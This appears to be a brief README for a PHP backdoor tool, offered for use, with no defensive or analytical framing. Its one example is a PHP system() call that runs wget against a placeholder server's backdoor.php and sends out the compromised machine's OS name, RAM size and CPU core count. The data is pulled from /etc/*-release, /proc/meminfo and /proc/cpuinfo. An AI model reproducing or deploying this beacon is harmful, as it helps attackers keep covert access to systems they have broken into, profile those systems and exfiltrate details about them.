# Backdoor
a simple backdoor made in php
Has different modules for different usage.


Example usage :- system("wget -qO \"/dev/null\" \"http://servername.xyz/backdoor.php?BlackdoorName=Nload&OS=$(cat /etc/*-release | grep NAME=\\\" | head -1 | cut -c 6- | tr \" \" \"-\")&Ram=$(grep MemTotal /proc/meminfo | cut -c 18- | tr \" \" \"-\")&Cores=$(grep -c ^processor /proc/cpuinfo | tr \" \" \"-\")\";")
